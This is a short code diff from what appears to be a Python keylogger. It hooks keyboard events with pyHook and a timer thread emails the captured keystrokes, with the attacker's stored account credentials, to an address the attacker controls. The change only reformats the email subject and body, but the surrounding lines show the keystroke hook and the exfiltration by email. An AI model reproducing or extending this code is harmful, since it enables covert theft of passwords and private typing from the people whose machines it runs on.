@@ -32,8 +32,8 @@ class TimerClass(threading.Thread):
                 PASS = EPASS
                 FROM = USER
                 TO = [USER]
-                SUBJECT = "[B33]: "+str(ts) 
-                MESSAGE = '[' + data + '] - Bee'
+                SUBJECT = "B33: "+str(ts) 
+                MESSAGE =  data 
                 message = """\ 
 From: %s
 To: %s
@@ -78,5 +78,4 @@ obj = pyHook.HookManager()
 obj.KeyDown = pushing
 obj.HookKeyboard()
 pythoncom.PumpMessages()
-
 
